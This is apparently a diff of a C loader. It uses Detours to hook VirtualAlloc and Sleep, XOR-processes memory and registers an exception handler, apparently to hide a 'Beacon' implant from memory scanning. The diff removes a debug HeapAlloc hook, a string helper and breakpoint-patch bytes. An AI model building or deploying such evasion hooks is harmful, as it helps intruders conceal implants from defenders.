@@ -21,15 +21,7 @@ LPVOID shellcode_addr;
 int count = 0;
 
 static LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;
-#if _MSC_VER < 1300
-static LPVOID(WINAPI*
-	OldHeapAlloc)(HANDLE hHeap, DWORD dwFlags, DWORD dwBytes)
-	= HeapAlloc;
-#else
-static LPVOID(WINAPI*
-	OldHeapAlloc)(HANDLE hHeap, DWORD dwFlags, DWORD_PTR dwBytes)
-	= HeapAlloc;
-#endif
+
 
 void xor_result(char* src, int length)
 {
@@ -39,39 +31,6 @@ void xor_result(char* src, int length)
 	}
 }
 
-#if _MSC_VER < 1300
-LPVOID WINAPI NewHeapAlloc(HANDLE hHeap, DWORD dwFlags, DWORD dwBytes)
-#else
-LPVOID WINAPI NewHeapAlloc(HANDLE hHeap, DWORD dwFlags, DWORD_PTR dwBytes)
-#endif
-
-{
-	LPVOID heapaddr;
-	if (dwBytes < 0x10000)
-		return OldHeapAlloc(hHeap, dwFlags, dwBytes);
-	else
-		heapaddr = OldHeapAlloc(hHeap, dwFlags, dwBytes);
-
-	printf("before len:%llx \n", dwBytes);
-	printf("before address:%p \n", heapaddr);
-	if (dwBytes == 0x800)
-	{
-		printf("HeapAlloc address:%p \n", heapaddr);
-		printf("HeapAlloc len:%llx \n", dwBytes);
-	}
-	return heapaddr;
-	//printf("arguements: %llx %llx %llx", hHeap, dwFlags, dwBytes);
-	//return heapaddr;
-	//if (heapaddr == 0)
-	//{
-	//	return NULL;
-	//}
-	//Beacon_address = heapaddr;
-	//Beacon_data_len = dwBytes;
-	//printf("分配大小:%d", Beacon_data_len);
-	//printf("分配地址:%llx \n", Beacon_address);
-	//return Beacon_address;
-}
 
 LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
 	count++;
@@ -103,7 +62,6 @@ void Hook()
 	DetourTransactionBegin(); // 开始HOOK
 	DetourUpdateThread(GetCurrentThread());
 	DetourAttach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
-	DetourAttach((PVOID*)&OldHeapAlloc, NewHeapAlloc);
 
 	DetourAttach((PVOID*)&OldSleep, NewSleep);
 	DetourTransactionCommit(); //  提交HOOK
@@ -114,7 +72,6 @@ void UnHook()
 	DetourTransactionBegin();
 	DetourUpdateThread(GetCurrentThread());
 	DetourDetach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
-	DetourDetach((PVOID*)&OldHeapAlloc, NewHeapAlloc);
 	DetourTransactionCommit();
 }
 
@@ -242,62 +199,7 @@ VectoredHandler(
 	}
 	return lResult;
 }
-#include <string.h>
-#include <stdlib.h>
-#include <stdio.h>
 
-//https://github.com/ssllab/temper1/blob/722991add4a6a239271e1f029ebe4daaad719496/strreplace.c
-char* strreplace(char const* const original,
-	char const* const pattern, char const* const replacement)
-{
-	size_t const replen = strlen(replacement);
-	size_t const patlen = strlen(pattern);
-	size_t const orilen = strlen(original);
-
-	size_t patcnt = 0;
-	const char* oriptr;
-	const char* patloc;
-
-	// find how many times the pattern occurs in the original string
-	for (oriptr = original; (patloc = strstr(oriptr, pattern)); oriptr = patloc + patlen)
-	{
-		patcnt++;
-	}
-
-	{
-		// allocate memory for the new string
-		size_t const retlen = orilen + patcnt * (replen - patlen);
-		char* const returned = (char*)malloc(sizeof(char) * (retlen + 1));
-
-		if (returned != NULL)
-		{
-			// copy the original string, 
-			// replacing all the instances of the pattern
-			char* retptr = returned;
-			for (oriptr = original; (patloc = strstr(oriptr, pattern)); oriptr = patloc + patlen)
-			{
-				size_t const skplen = patloc - oriptr;
-				// copy the section until the occurence of the pattern
-				strncpy(retptr, oriptr, skplen);
-				retptr += skplen;
-				// copy the replacement 
-				strncpy(retptr, replacement, replen);
-				retptr += replen;
-			}
-			// copy the rest of the string.
-			strcpy(retptr, oriptr);
-		}
-		return returned;
-	}
-}
-
-
-const char ori_malloc[5] = {
-	0xE8, 0x58, 0x16, 0x00, 0x00
-};
-const char patch_malloc[5] = {
-	0xCC, 0x58, 0x16, 0x00, 0x00
-};
 //47718
 int main()
 {
